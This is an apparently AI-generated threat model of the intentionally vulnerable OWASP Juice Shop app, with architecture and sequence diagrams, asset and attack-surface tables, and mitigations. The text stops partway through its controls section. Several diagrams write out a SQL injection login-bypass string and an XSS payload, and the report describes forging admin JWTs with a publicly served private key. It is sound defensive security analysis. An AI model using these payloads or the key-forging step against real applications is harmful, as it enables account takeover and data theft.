# Threat Model — OWASP Juice Shop

| Field | Value |
|-------|-------|
| Generated | 2026-04-09T08:35:00Z |
| Analysis Duration | 18 min 37 s |
| Analyst | appsec-threat-analyst (Claude) |
| Model | claude-sonnet-4-6 |
| Agent Models | claude-sonnet-4-6 (stride-analyzer: claude-opus-4-5) |
| Input Tokens | unavailable |
| Output Tokens | unavailable |
| Cache Read Tokens | unavailable |
| Cache Write Tokens | unavailable |
| Estimated Cost | unavailable |
| Context Sources | Local appsec-requirements-example.yaml (server offline) |

> ℹ Token and cost data are not accessible at agent runtime. Check the Anthropic Console for usage details of this session.

---

## Table of Contents

1. [System Overview](#1-system-overview)
2. [Architecture Diagrams](#2-architecture-diagrams)
   - 2.1 [System Context](#21-system-context)
   - 2.2 [Containers](#22-containers)
   - 2.3 [Technology Architecture](#23-technology-architecture)
   - 2.4 [Security Architecture Assessment](#24-security-architecture-assessment)
3. [Security-Relevant Use Cases](#3-security-relevant-use-cases)
4. [Assets](#4-assets)
5. [Attack Surface](#5-attack-surface)
6. [Trust Boundaries](#6-trust-boundaries)
7. [Identified Security Controls](#7-identified-security-controls)
   - 7b. [Requirements Compliance](#7b-requirements-compliance)
8. [Threat Register](#8-threat-register)
9. [Critical Findings](#9-critical-findings)
10. [Mitigation Register](#10-mitigation-register)
11. [Out of Scope](#11-out-of-scope)

---

## Management Summary

This assessment covers OWASP Juice Shop v19.2.1, an intentionally vulnerable Node.js/Express e-commerce application. The findings below reflect how the application would be evaluated if deployed in a production environment.

### Top Findings

The application has **5 Critical and 8 High** risk threats across all OWASP Top 10 categories. The most severe issues are:

1. **JWT private key exposure** — The RSA private key is hardcoded in source and served publicly, enabling any attacker to forge admin tokens ([T-001](#t-001), [T-002](#t-002)).
2. **SQL injection in core auth path** — Unauthenticated attackers can bypass authentication or dump the entire database ([T-003](#t-003), [T-004](#t-004)).
3. **JWT in localStorage + stored XSS** — Stored XSS combined with localStorage token storage enables full account takeover ([T-005](#t-005), [T-006](#t-006)).
4. **Server-side code execution via eval()** — Two separate eval()-based RCE paths exist in authenticated routes ([T-009](#t-009), [T-010](#t-010)).
5. **No authentication on admin endpoints** — Admin configuration routes are publicly accessible with no middleware ([T-015](#t-015)).

### Recommended Priority Actions

| Priority | Mitigation | Addresses |
|----------|-----------|-----------|
| 1 — Immediate | [M-001](#m-001) Remove hardcoded JWT private key from source | [T-001](#t-001) |
| 1 — Immediate | [M-002](#m-002) Remove public /encryptionkeys endpoint | [T-002](#t-002), [T-014](#t-014) |
| 1 — Immediate | [M-003](#m-003) Parameterize all SQL queries | [T-003](#t-003), [T-004](#t-004) |
| 2 — High | [M-004](#m-004) Move JWT from localStorage to HttpOnly cookie | [T-005](#t-005) |
| 2 — High | [M-005](#m-005) Remove bypassSecurityTrustHtml; add CSP | [T-006](#t-006) |
| 2 — High | [M-008](#m-008) Remove eval/vm.runInContext from routes | [T-009](#t-009), [T-010](#t-010) |
| 3 — Medium | [M-012](#m-012) Protect admin and sensitive endpoints | [T-015](#t-015), [T-016](#t-016) |

---

## 1. System Overview

**OWASP Juice Shop** (v19.2.1) is an intentionally vulnerable web application maintained by the OWASP Foundation. It serves as a security training platform, CTF competition host, and benchmark for security scanning tools. The application simulates a modern e-commerce storefront with full user registration, product catalog, shopping basket, order processing, user feedback, file uploads, an admin panel, and a REST API.

**Important context:** Juice Shop is deliberately insecure by design. Many of the findings in this report are intentional vulnerabilities serving educational and CTF purposes. This assessment treats the application as if it were a production e-commerce system — which is the appropriate lens for evaluating whether it correctly simulates real-world attack patterns — and documents how each vulnerability would be exploited in a genuine deployment.

**Complexity tier: Moderate.** The system is a monolith (single Express process, port 3000) that bundles an Angular SPA, a REST API (~50 routes), an embedded SQLite/MarsDB database, WebSocket support, a chatbot service, FTP/log file serving, and a Prometheus metrics endpoint. The single-process model simplifies operations but concentrates risk: compromise of any one subsystem can cascade to all others.

**Deployment:** Docker (distroless `gcr.io/distroless/nodejs24-debian13` image), non-root user (UID 65532), port 3000. No TLS termination in the container — the application runs plain HTTP and relies on an upstream reverse proxy (not present in the repository) for HTTPS. No Kubernetes manifests or cloud provider configuration.

**Tech stack:** TypeScript/Node.js 24 backend, Angular 20 SPA frontend, SQLite via Sequelize 6, JWT RS256 authentication, Google OAuth, TOTP 2FA, Socket.IO, Prometheus metrics.

**Context sources:** Local requirements file (`appsec-requirements-example.yaml`). No external context endpoint reachable. Business context inferred from README. Known threats from team-provided `known-threats.yaml` (7 entries: 4 open, 2 accepted, 1 mitigated, 1 false-positive).

**Overall security impression:** The application demonstrates an exceptionally wide attack surface across all OWASP Top 10 categories. Four team-confirmed critical/high issues remain open (JWT key forgery, SQL injection, stored XSS, token in localStorage). The monolithic architecture means a single exploit of the SQL injection or RCE vulnerability gives full database and potentially server-side code execution access.

---

## 2. Architecture Diagrams

The following diagrams provide C4-style views of the system architecture, from high-level context through container and technology layers, followed by a security architecture assessment.

### 2.1 System Context

```mermaid
graph TD
    classDef person   fill:#08427B,stroke:#073B6F,color:#fff
    classDef system   fill:#1168BD,stroke:#0E5CA8,color:#fff
    classDef external fill:#999,stroke:#666,color:#fff
    classDef db       fill:#2E7D32,stroke:#1B5E20,color:#fff
    classDef risk     fill:#FFB6C1,stroke:#c00,color:#000,stroke-width:2px

    subgraph INTERNET["🌐 Public Internet · untrusted"]
        ANON["Anonymous User\nBrowser / CTF participant"]:::person
        ADMIN["Admin User\nBrowser / shop operator"]:::person
        ATTACKER["Threat Actor\nBrowser / automated tool"]:::person
    end

    subgraph DMZ["🔶 DMZ / Edge Layer (assumed — not in repo)"]
        RP["Reverse Proxy\nnginx / Caddy\n(assumed upstream)\non-prem / unknown"]:::external
    end

    subgraph INTERNAL["🔒 Internal Network · trusted"]
        JS["OWASP Juice Shop\nNode.js 24 / Express 4\nTypeScript · Docker distroless\nport 3000 (HTTP)"]:::system
    end

    subgraph EXT["🌐 External Services"]
        GOOGLE["Google OAuth 2.0\naccounts.google.com\nOpenID Connect"]:::external
        GITHUB["GitHub Actions CI\ngithub.com\nCodeQL + ZAP"]:::external
    end

    ANON -->|"HTTPS · TLS (via proxy)"| RP
    ADMIN -->|"HTTPS · TLS (via proxy)"| RP
    ATTACKER -->|"HTTP direct (no TLS in app)"| JS
    RP -->|"HTTP · port 3000 (unencrypted)"| JS
    JS -->|"GET userinfo (access_token in URL)"| GOOGLE
    GITHUB -->|"git clone · builds · ZAP scan"| JS

    %% Trust Boundary Key:
    %% 🌐 Public Internet → 🔶 DMZ: assumed reverse proxy (nginx/Caddy) — TLS termination
    %% 🔶 DMZ → 🔒 Internal: HTTP proxy forwarding — no application-level auth at edge
    %% 🔒 Internal → 🌐 External: JWT-based OAuth token exchange with Google
```

### 2.2 Containers

```mermaid
graph TD
    classDef person   fill:#08427B,stroke:#073B6F,color:#fff
    classDef system   fill:#1168BD,stroke:#0E5CA8,color:#fff
    classDef external fill:#999,stroke:#666,color:#fff
    classDef db       fill:#2E7D32,stroke:#1B5E20,color:#fff
    classDef risk     fill:#FFB6C1,stroke:#c00,color:#000,stroke-width:2px

    subgraph INTERNET["🌐 Public Internet · untrusted"]
        USER["End User\nBrowser"]:::person
    end

    subgraph DOCKER["🔒 Docker Container · distroless nodejs24 · UID 65532"]

        subgraph FRONTEND["Angular SPA · served as static files"]
            SPA["Angular 20 SPA\nTypeScript · Angular Material\nBuilt with Angular CLI\nServed from /frontend/dist"]:::system
        end

        subgraph BACKEND["Express REST API · Node.js 24"]
            API["Express 4 REST API\nNode.js 24 / TypeScript\n50+ route handlers\nJWT RS256 middleware"]:::risk
            WS["Socket.IO Server\nSocket.IO 3.1\nNode.js 24\nReal-time events"]:::system
            BOT["Juicy Chat Bot\njuicy-chat-bot library\nRules-based NLU\nHTTP POST /rest/chatbot"]:::system
            FTP["FTP Static Server\nExpress static + serve-index\nPublicly browsable\n/ftp directory"]:::risk
            METRICS["Prometheus Metrics\nprom-client\nHTTP GET /metrics\nUnauthenticated"]:::risk
        end

        subgraph DATA["🔐 Data Tier · restricted"]
            SQLITE[("SQLite 3\nSequelize 6 ORM\ndata/juiceshop.sqlite\nin-process file DB")]:::db
            MARSDB[("MarsDB\nIn-memory NoSQL\nProduct reviews\nin-process")]:::db
            KEYS["Encryption Keys\nencryptionkeys/\njwt.pub + jwt.pem\non-disk"]:::risk
        end
    end

    subgraph EXT["🌐 External Services"]
        GOOGLE["Google OAuth 2.0\naccounts.google.com"]:::external
    end

    USER -->|"HTTP/HTTPS GET · static assets"| SPA
    USER -->|"REST API calls · Bearer JWT"| API
    USER -->|"WebSocket · /socket.io"| WS
    USER -->|"POST /rest/chatbot/respond"| BOT
    API -->|"SQL queries · Sequelize · in-process"| SQLITE
    API -->|"NoSQL queries · MarsDB · in-process"| MARSDB
    API -->|"fs.readFileSync · RSA key load"| KEYS
    API -->|"GET userinfo (access_token in URL)"| GOOGLE
    WS -->|"event emit · in-process"| API

    %% Trust Boundary Key:
    %% 🌐 Public Internet → Docker: HTTP port 3000 (expected TLS from upstream proxy)
    %% Express API → Data Tier: in-process Sequelize calls — no network boundary
    %% Express API → Encryption Keys: file system read — key compromise = JWT forgery
```

### 2.3 Technology Architecture

```mermaid
graph TB
    classDef person   fill:#08427B,stroke:#073B6F,color:#fff
    classDef system   fill:#1168BD,stroke:#0E5CA8,color:#fff
    classDef external fill:#999,stroke:#666,color:#fff
    classDef db       fill:#2E7D32,stroke:#1B5E20,color:#fff
    classDef risk     fill:#FFB6C1,stroke:#c00,color:#000,stroke-width:2px

    subgraph CLIENT["Browser · User Device"]
        BROWSER["Angular 20 SPA\nAngular Material + RxJS 7.8\nTypeScript · Node 24 build\nJWT stored in localStorage"]:::risk
    end

    subgraph RUNTIME["Docker · distroless nodejs24-debian13 · UID 65532 · port 3000"]
        EXPRESSAPP["Express 4.22 App\nNode.js 24 runtime\nTypeScript (compiled)\nexpress-jwt 0.1.3 (outdated)"]:::risk
        SOCKETIO["Socket.IO 3.1\nWebSocket server\nReal-time notifications"]:::system
        HELMET["helmet 4.6\nX-Frame, X-Content-Type\n(CSP disabled, XSS filter off)"]:::system
        MORGAN["morgan + winston\nHTTP access logging\nJSON audit file"]:::system
    end

    subgraph STORAGE["In-Process Storage"]
        SQLITEDB[("SQLite 3 / Sequelize 6\ndata/juiceshop.sqlite\nNo encryption at rest")]:::db
        MARSDBSTORE[("MarsDB in-memory\nProduct reviews\nVolatile — lost on restart")]:::db
        LOCALKEYS["encryptionkeys/\njwt.pub + jwt.pem\nRSA-2048 on disk\n(also hardcoded in code)"]:::risk
    end

    subgraph CICD["CI/CD · GitHub Actions"]
        CODEQL["CodeQL SAST\njavascript-typescript\nsecurity-extended queries"]:::system
        ZAP["OWASP ZAP DAST\nzap_scan.yml\nautomated spider + active scan"]:::system
    end

    BROWSER -->|"HTTP/HTTPS · REST · Bearer JWT"| EXPRESSAPP
    BROWSER -->|"WebSocket upgrade"| SOCKETIO
    EXPRESSAPP -->|"Sequelize ORM · SQLite driver"| SQLITEDB
    EXPRESSAPP -->|"MarsDB in-process queries"| MARSDBSTORE
    EXPRESSAPP -->|"fs.readFileSync"| LOCALKEYS
    SOCKETIO -->|"in-process event bus"| EXPRESSAPP
    CICD -->|"git pull · scan"| EXPRESSAPP
    %% Trust Boundary Key:
    %% Browser → Docker: HTTP/HTTPS port 3000 (TLS expected from upstream proxy)
    %% Docker → In-Process Storage: direct in-process calls — no network boundary
    %% CI/CD → Docker: git pull + scan — no runtime access to user data
```

### 2.4 Security Architecture Assessment

#### Architecture Patterns

| Pattern | Present | Notes |
|---------|---------|-------|
| API Gateway | ❌ | No API gateway — Express handles all routing, auth, and business logic directly |
| Backend for Frontend (BFF) | ❌ | Angular SPA calls Express directly; no BFF proxy; JWT held in `localStorage` |
| Defense-in-depth | ❌ | Single process, single port — no WAF, no mTLS, no network segmentation within container |
| Separation of concerns | ⚠️ | Route files separate concerns structurally, but auth/authz logic mixed between `lib/insecurity.ts` and individual routes |
| Least privilege | ⚠️ | Container runs as UID 65532 (non-root), but the JWT RS256 private key is hardcoded in source and readable by any authenticated user |
| Secrets management | ❌ | All secrets hardcoded in source (`lib/insecurity.ts`): RSA private key, HMAC signing key, cookie secret; no vault or env var injection |
| Network segmentation | ❌ | All services (API, DB, FTP, metrics, encryption keys) run in same process with no isolation |
| Secure defaults | ❌ | CORS allow-all, no CSP, XSS filter commented out, no HSTS, `express-jwt` pinned to 0.1.3 (2014), `jsonwebtoken` pinned to 0.4.0 (2014) |

#### Trust Model Evaluation

The trust model has a **single flat trust tier** inside the Docker container. The Express process simultaneously:
- Serves the Angular SPA (public)
- Handles all REST API routes (mixed auth/unauth)
- Serves the FTP file directory (public — intentional vuln)
- Serves encryption keys at `/encryptionkeys` (public — critical vuln)
- Exposes Prometheus metrics at `/metrics` (public)
- Exposes Swagger UI at `/api-docs` (public)
- Exposes application logs at `/support/logs` (public)
- Maintains the SQLite database (in-process, no boundary)

There is **no fail-closed** auth architecture. Unauthenticated access to `/rest/admin/application-configuration` and `/rest/admin/application-version` is confirmed at `server.ts:604-605`. The encryption key directory (`/encryptionkeys`) is publicly browsable at `server.ts:277-278`, meaning an attacker can download the JWT private key and forge admin tokens — bypassing the entire auth system.

The **implicit trust** between the Express middleware layers means that a successful SQL injection in `routes/login.ts` or `routes/search.ts` has the same privilege level as a legitimate admin session — full database access with no additional control layer.

#### Authentication and Authorization Architecture

- **Authentication:** RS256 JWT issued at `/rest/user/login`. Tokens signed with a hardcoded RSA private key (embedded string literal in `lib/insecurity.ts:23`). Token lifetime: 6 hours. Tokens stored client-side in `localStorage` (XSS-accessible). `express-jwt@0.1.3` (released ~2014) used as middleware — not `jsonwebtoken` 9.x with modern claim validation.
- **Authorization:** Custom role-based middleware (`security.isAuthorized()`) via `expressJwt`. Role field (`role`) carried in JWT payload — if JWT is forged, attacker can claim any role. No centralized RBAC engine — each route applies its own auth middleware calls inconsistently. Several admin routes have no middleware at all (`server.ts:604-605`).
- **OAuth:** Google OAuth configured with explicit redirect URIs (positive). Access token passed as URL query parameter to Google userinfo endpoint — token leaks into server logs and Referer headers.
- **2FA:** TOTP via `otplib` supported (`/rest/2fa/*`) — good. But the 2FA `totpSecret` is stored in the User model (plaintext in SQLite).

#### Key Architectural Risks

| # | Structural Risk | Impact if Exploited | Linked Threats |
|---|-----------------|--------------------|----|
| 1 | JWT private key hardcoded in source + served at `/encryptionkeys` | Any user can forge admin-level JWT → full application takeover | [T-001](#t-001), [T-002](#t-002) |
| 2 | No BFF; SPA stores JWT in `localStorage` | XSS → instant token exfiltration → account takeover | [T-005](#t-005), [T-006](#t-006) |
| 3 | No network isolation between API, DB, FTP, keys, and metrics subsystems | Single exploit cascades to all subsystems | [T-001](#t-001), [T-003](#t-003), [T-007](#t-007) |
| 4 | SQL injection in core auth path (`login.ts`) bypasses all authentication | Authentication bypass without needing credentials | [T-003](#t-003) |
| 5 | Server-side code execution via `eval()` in `routes/b2bOrder.ts` and `routes/userProfile.ts` | Full server-side code execution with the application's file system access | [T-009](#t-009), [T-010](#t-010) |

#### Overall Architecture Security Rating

**🔴 Critical gaps.** The application has no functioning defense-in-depth: the RSA private key used to sign authentication tokens is simultaneously hardcoded in source code and served publicly over HTTP. The core authentication route (`/rest/user/login`) is exploitable via SQL injection without credentials. Two separate server-side code execution paths exist via `eval()`. All these critical vulnerabilities exist at the architectural level (not as edge-case bugs), meaning any production deployment of this application in its current state would be immediately compromised.

---

## 3. Security-Relevant Use Cases

The following sequence diagrams trace the most security-sensitive flows through the application, highlighting where input validation, authentication, and authorization controls are absent or bypassed.

### 3.1 Input Validation Flow

```mermaid
sequenceDiagram
    participant U as User Browser
    participant E as Express API
    participant RTE as Route Handler
    participant DB as SQLite/Sequelize

    U->>E: POST /rest/user/login {"email":"x","password":"y"}
    E->>E: body-parser parses JSON (no schema validation)
    E->>RTE: routes/login.ts handler invoked
    Note over RTE: req.body.email used DIRECTLY in SQL
    RTE->>DB: SELECT * FROM Users WHERE email = 'x' AND password = 'md5(y)'
    Note over DB: No parameterization — SQLi possible
    DB-->>RTE: User row (or error)
    RTE-->>E: 200 OK + JWT token (or 401)
    E-->>U: JSON response

    Note over U,DB: MISSING: schema validation, allowlist, field-length check
    Note over RTE: RISK: email=''' OR 1=1-- bypasses auth entirely
```
<!-- QA: sequence diagram '3.1 Input Validation Flow' has no alt/else failure path — consider adding error scenarios (invalid input, permission denied, unexpected response) -->

### 3.2 Frontend Security

```mermaid
sequenceDiagram
    participant U as User Browser
    participant SPA as Angular SPA
    participant API as Express API
    participant DOM as DOM

    U->>SPA: Navigate to /about
    SPA->>API: GET /api/Feedbacks
    API-->>SPA: [{comment:"<script>alert(1)</script>", ...}]
    Note over SPA: about.component.ts:119 calls
    Note over SPA: sanitizer.bypassSecurityTrustHtml(comment)
    SPA->>DOM: innerHTML = raw HTML (unsanitized)
    DOM->>U: XSS payload executes in browser

    Note over DOM: MISSING: CSP header, output encoding
    Note over SPA: BUG: bypassSecurityTrustHtml() explicitly defeats Angular's sanitizer
    Note over U: IMPACT: attacker script reads localStorage.getItem('token')
```
<!-- QA: sequence diagram '3.2 Frontend Security' has no alt/else failure path — consider adding error scenarios (invalid input, permission denied, unexpected response) -->

### 3.3 Database Security

```mermaid
sequenceDiagram
    participant U as Attacker
    participant API as Express API
    participant SEQ as Sequelize Layer
    participant DB as SQLite

    Note over U,DB: Path A — Vulnerable (login route)
    U->>API: POST /rest/user/login {"email":"' OR 1=1--","password":"x"}
    API->>DB: SELECT * FROM Users WHERE email='' OR 1=1--' AND password='...'
    Note over DB: Raw SQL via models.sequelize.query() — no bind params
    DB-->>API: First user row (admin)
    API-->>U: 200 OK + admin JWT

    Note over U,DB: Path B — Safe (most other routes)
    U->>API: GET /api/Products/1
    API->>SEQ: Product.findByPk(id)
    SEQ->>DB: SELECT * FROM Products WHERE id = ? [bind: 1]
    DB-->>SEQ: Product row
    SEQ-->>API: Product object
    API-->>U: 200 OK + product JSON
```
<!-- QA: sequence diagram '3.3 Database Security' has no alt/else failure path — consider adding error scenarios (invalid input, permission denied, unexpected response) -->

### 3.4 Authentication Flow

```mermaid
sequenceDiagram
    participant U as User Browser
    participant SPA as Angular SPA
    participant API as Express API
    participant DB as SQLite
    participant KEY as encryptionkeys/jwt.pem

    U->>SPA: Enter email + password → Submit
    SPA->>API: POST /rest/user/login {"email":"...","password":"..."}
    API->>DB: SELECT * FROM Users WHERE email='...' AND password='md5(...)'
    Note over DB: SQL injection vulnerability here (routes/login.ts:34)
    DB-->>API: User record

    alt 2FA enabled
        API-->>SPA: 401 {status:"totp_token_required", tmpToken}
        U->>SPA: Enter TOTP code
        SPA->>API: POST /rest/2fa/verify {tmpToken, totp}
        API->>API: otplib.totp.verify(secret, totp)
        API-->>SPA: 200 + final JWT
    else No 2FA
        API->>KEY: fs.readFileSync('encryptionkeys/jwt.pem') — on startup
        Note over KEY: Private key also hardcoded in lib/insecurity.ts:23
        API->>API: jwt.sign(user, privateKey, {algorithm:'RS256', expiresIn:'6h'})
        API-->>SPA: 200 {authentication:{token, bid, umail}}
        SPA->>SPA: localStorage.setItem('token', jwt)
        Note over SPA: Token now accessible to any JS on same origin
    end
```

### 3.5 Authorization / Access Control

```mermaid
sequenceDiagram
    participant U as User Browser
    participant MW as Express Middleware
    participant JWTMw as express-jwt@0.1.3
    participant Route as Route Handler
    participant DB as SQLite

    U->>MW: GET /api/Users (list all users)
    MW->>JWTMw: security.isAuthorized() middleware
    JWTMw->>JWTMw: jwt.verify(token, publicKey)
    Note over JWTMw: express-jwt 0.1.3 — no iss/aud/alg validation
    JWTMw-->>Route: req.user = {id, role, ...} decoded from JWT

    alt Token forged with hardcoded private key
        Note over Route: role='admin' in forged JWT — no second check
        Route->>DB: SELECT * FROM Users
        DB-->>Route: All user records including passwords
        Route-->>U: 200 + full user list including hashed passwords
    else No auth header
        JWTMw-->>U: 401 Unauthorized
    end

    Note over MW,DB: MISSING: issuer/audience check, role re-verification against DB
    Note over MW: RISK: /rest/admin/application-configuration has NO isAuthorized() call
```

### 3.6 Secret Management

```mermaid
sequenceDiagram
    participant DEV as Developer
    participant GIT as Git Repository
    participant BUILD as Docker Build
    participant RT as Runtime Process
    participant FS as File System

    DEV->>GIT: git commit lib/insecurity.ts (contains RSA private key)
    GIT->>BUILD: COPY . /juice-shop (Dockerfile line 2)
    BUILD->>RT: Container image baked with private key in source
    BUILD->>FS: encryptionkeys/jwt.pem also copied to container

    RT->>FS: app startup — fs.readFileSync('encryptionkeys/jwt.pem')
    Note over RT: Key also hardcoded at lib/insecurity.ts:23
    RT->>RT: Use privateKey for jwt.sign()

    Note over GIT,FS: CRITICAL: Private key in git history forever
    Note over FS: CRITICAL: /encryptionkeys served publicly (server.ts:277)
    Note over FS: Any HTTP client can GET /encryptionkeys/jwt.pem
```
<!-- QA: sequence diagram '3.6 Secret Management' has no alt/else failure path — consider adding error scenarios (invalid input, permission denied, unexpected response) -->

### 3.7 Google OAuth Flow

```mermaid
sequenceDiagram
    participant U as User Browser
    participant SPA as Angular SPA
    participant API as Express API
    participant G as Google OAuth

    U->>SPA: Click "Sign in with Google"
    SPA->>G: Redirect to accounts.google.com/oauth2/authorize?client_id=...
    Note over SPA: No PKCE (code_challenge) observed
    Note over SPA: No state parameter validation observed
    G-->>SPA: Redirect with ?code=AUTH_CODE
    SPA->>API: GET /rest/oauth2/googleCallback?code=AUTH_CODE
    API->>G: POST /oauth2/token (exchange code)
    G-->>API: access_token + id_token
    API->>G: GET /oauth2/v3/userinfo?access_token=TOKEN_VALUE
    Note over API: Token in URL query param — logged by server/proxy
    G-->>API: User info
    API->>API: Find or create user; issue Juice Shop JWT
    API-->>SPA: 200 + JWT
    SPA->>SPA: localStorage.setItem('token', jwt)
```
<!-- QA: sequence diagram '3.7 Google OAuth Flow' has no alt/else failure path — consider adding error scenarios (invalid input, permission denied, unexpected response) -->

---

## 4. Assets

| Asset | Classification | Description | Linked Threats |
|-------|---------------|-------------|---------------|
| User credentials (email, MD5/bcrypt passwords) | Confidential | User accounts in SQLite `Users` table; MD5 hashes are crackable | [T-003](#t-003), [T-004](#t-004), [T-011](#t-011) |
| JWT RSA private key | Restricted | Signs all authentication tokens; compromise = forge any identity | [T-001](#t-001), [T-002](#t-002) |
| TOTP secrets (`totpSecret`) | Restricted | 2FA seeds stored plaintext in User model | [T-003](#t-003), [T-011](#t-011) |
| Payment card data (`Card` model) | Restricted | Simulated card data — if real, PCI-DSS in scope | [T-003](#t-003), [T-011](#t-011) |
| User PII (name, email, address) | Confidential | `User`, `Address` models; GDPR-relevant | [T-003](#t-003), [T-005](#t-005), [T-011](#t-011) |
| Application logs (`/support/logs`) | Internal | HTTP access logs publicly readable; may contain tokens, PII | [T-014](#t-014) |
| SQLite database file | Confidential | Contains all user, order, product, feedback, and challenge data | [T-003](#t-003), [T-011](#t-011) |
| Application source code / config | Internal | Config YAML with Google OAuth client ID; secrets in source | [T-001](#t-001), [T-002](#t-002) |
| Admin session / admin JWT | Restricted | Allows challenge management, user administration | [T-001](#t-001), [T-005](#t-005), [T-006](#t-006) |
| Server-side execution environment | Restricted | Node.js process; writable file paths under app directory | [T-009](#t-009), [T-010](#t-010) |

---

## 5. Attack Surface

| Entry Point | Protocol/Method | Authentication | Notes | Linked Threats |
|------------|-----------------|---------------|-------|---------------|
| `POST /rest/user/login` | HTTP POST | None (issues JWT) | SQL injection in email/password fields | [T-003](#t-003) |
| `GET /rest/products/search?q=` | HTTP GET | None | SQL injection via `q` parameter | [T-003](#t-003) |
| `GET /api/Users` | HTTP GET/Bearer JWT | JWT required | Returns all users if token valid; IDOR if ID guessable | [T-005](#t-005), [T-018](#t-018) |
| `POST /rest/chatbot/respond` | HTTP POST | Optional JWT | Rules-based bot; no injection risk but unauthenticated | — |
| `POST /file-upload` | HTTP POST | None observed | File upload — extension bypass challenges; XXE via XML | [T-013](#t-013) |
| `POST /rest/b2bOrder` | HTTP POST | JWT required | `eval()` on `orderLinesData` body field — RCE | [T-009](#t-009) |
| `POST /rest/user/profile` | HTTP POST | JWT required | `eval()` on username pattern `#{...}` — SSTI | [T-010](#t-010) |
| `POST /profile/image/url` | HTTP POST | JWT required | SSRF via `imageUrl` body field | [T-012](#t-012) |
| `GET /ftp/*` | HTTP GET | None | Public FTP directory browsable; sensitive files downloadable | [T-014](#t-014) |
| `GET /encryptionkeys/*` | HTTP GET | None | JWT public+private key pair downloadable — Critical | [T-002](#t-002) |
| `GET /support/logs/*` | HTTP GET | None | HTTP access logs downloadable — token/PII disclosure | [T-014](#t-014) |
| `GET /metrics` | HTTP GET | None | Prometheus metrics — infrastructure topology disclosure | [T-016](#t-016) |
| `GET /api-docs` | HTTP GET | None | Swagger UI — full API documentation public | [T-016](#t-016) |
| `GET /rest/admin/application-configuration` | HTTP GET | **None** | Admin config endpoint — no auth middleware | [T-015](#t-015) |
| `GET /rest/admin/application-version` | HTTP GET | **None** | Admin version endpoint — no auth middleware | [T-015](#t-015) |
| `WS /socket.io` | WebSocket | Optional JWT | Challenge notification events | [T-017](#t-017) |
| `POST /rest/oauth2/googleCallback` | HTTP GET | None (pre-auth) | OAuth callback — no `state` param validation observed | [T-007](#t-007) |
| `POST /rest/2fa/verify` | HTTP POST | Partial (tmpToken) | TOTP verification; tmpToken short-lived | — |
| `POST /rest/user/reset-password` | HTTP POST | None (rate limited) | Password reset via security questions — rate limited (100/5min) | [T-019](#t-019) |
| `GET /rest/user/authentication-details` | HTTP GET | JWT required | Lists all active sessions/tokens | [T-005](#t-005) |

**Unauthenticated entry points of concern:** `/rest/user/login` (SQLi), `/rest/products/search` (SQLi), `/encryptionkeys/` (key disclosure), `/ftp/` (file disclosure), `/support/logs/` (log disclosure), `/metrics`, `/api-docs`, `/rest/admin/application-configuration`, `/rest/admin/application-version`.

---

## 6. Trust Boundaries

The system has a **collapsed trust model** — all components share a single process trust level. Effective trust boundaries exist only at the Docker container edge and the individual middleware application points.

| # | Boundary | From | To | Enforcement Mechanism | Key Weakness | Linked Threats |
|---|----------|------|----|----------------------|-------------|---------------|
| 1 | Internet → Express App | Public users | Express HTTP port 3000 | Expected reverse proxy (not in repo); no WAF | Application runs plain HTTP; no application-level edge auth | [T-003](#t-003), [T-009](#t-009), [T-010](#t-010) |
| 2 | Unauthenticated → Authenticated routes | Anonymous | JWT-protected routes | `security.isAuthorized()` via `express-jwt@0.1.3` | Several admin routes have no middleware; JWT forged with hardcoded key | [T-001](#t-001), [T-002](#t-002), [T-015](#t-015) |
| 3 | User role → Admin role | Authenticated user | Admin operations | JWT `role` claim check | Role embedded in JWT payload; private key hardcoded → forge admin role | [T-001](#t-001), [T-006](#t-006) |
| 4 | Express → SQLite | API handlers | SQLite via Sequelize | Sequelize ORM (partially used) | Two critical routes use raw SQL string interpolation (SQLi) | [T-003](#t-003), [T-011](#t-011) |
| 5 | Express → File System | API handlers | `encryptionkeys/`, `ftp/`, `logs/` | Express static serve | All three directories served publicly with no auth | [T-002](#t-002), [T-014](#t-014) |
| 6 | Express → External (Google OAuth) | OAuth callback | Google userinfo API | OAuth 2.0 authorization code | Access token passed as URL query param; no PKCE or `state` validation | [T-007](#t-007), [T-008](#t-008) |
| 7 | Express → Node.js runtime | b2bOrder, userProfile routes | Node.js `eval()` | `notevil` sandbox (bypassable) | Direct code execution with app process privileges | [T-009](#t-009), [T-010](#t-010) |

**Prose summary:** The most critical boundary weakness is #5 (Express → File System) combined with #3 (User → Admin). The encryption key directory is served publicly without authentication (`server.ts:277`), and the same private key is hardcoded in source (`lib/insecurity.ts:23`). An attacker does not need to exploit any application vulnerability — they can download the private key directly and forge a JWT claiming `role: admin`. All other auth boundaries then collapse.

---

## 7. Identified Security Controls

**Critical gap summary (top 5):**
1. **JWT private key exposed publicly** at `/encryptionkeys` — no authentication on the route serving it; also hardcoded in source code.
2. **No parameterization on critical SQL queries** — `routes/login.ts:34` and `routes/search.ts:23` use raw string interpolation.
3. **No Content Security Policy** — Angular SPA's `bypassSecurityTrustHtml()` is not mitigated by any CSP header.
4. **No HTTPS at the application layer** — plain HTTP only; TLS depends on an external proxy not present in this repository.
5. **`express-jwt@0.1.3` and `jsonwebtoken@0.4.0`** — versions from ~2014; known missing claim validation features.

Legend: ✅ Adequate | ⚠️ Partial | 🔶 Weak | ❌ Missing

| Domain | Control | Implementation | Effectiveness |
|--------|---------|---------------|---------------|
| Identity & Access Management | JWT issuance (RS256) | [`lib/insecurity.ts:56`](vscode://file/home/mrohr/juice-shop/lib/insecurity.ts:56) — `jwt.sign(user, privateKey, {algorithm:'RS256', expiresIn:'6h'})` | 🔶 Weak — private key hardcoded and publicly served |
| Identity & Access Management | JWT validation middleware | [`lib/insecurity.ts:54`](vscode://file/home/mrohr/juice-shop/lib/insecurity.ts:54) — `expressJwt({secret: publicKey})` via `express-jwt@0.1.3` | 🔶 Weak — outdated library; no `iss`/`aud`/`alg` validation |
| Identity & Access Management | TOTP 2FA | [`routes/2fa.ts`](vscode://file/home/mrohr/juice-shop/routes/2fa.ts) — `otplib.totp.verify()` | ⚠️ Partial — functional but `totpSecret` stored plaintext in DB |
| Identity & Access Management | Password hashing | [`models/user.ts:77`](vscode://file/home/mrohr/juice-shop/models/user.ts:77) — `security.hash(clearTextPassword)` → MD5 | ❌ Missing — MD5 is not a password KDF; no bcrypt/argon2 anywhere |
| Identity & Access Management | Account lockout | Rate limit on `/rest/user/reset-password` (100 req/5min) [`server.ts:343`](vscode://file/home/mrohr/juice-shop/server.ts:343) | 🔶 Weak — no lockout on `/rest/user/login`; reset only |
